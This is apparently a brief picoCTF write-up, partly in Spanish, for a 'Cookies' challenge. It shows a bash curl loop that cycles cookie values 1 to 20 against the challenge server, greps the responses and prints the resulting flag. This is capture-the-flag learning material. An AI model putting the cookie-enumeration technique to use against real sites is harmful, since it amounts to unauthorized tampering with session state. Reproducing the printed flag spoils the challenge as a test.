#### Description 

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

for i in {1..20}; do curl http://mercury.picoctf.net:21485/check -H 'Cookie: name=$i'; done


En la terminal de linux vemos todas las galletas y buscamos la que diga picoCTF
````
lesly@Lesly:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep -oE "picoCTF{.*?}"
            picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
```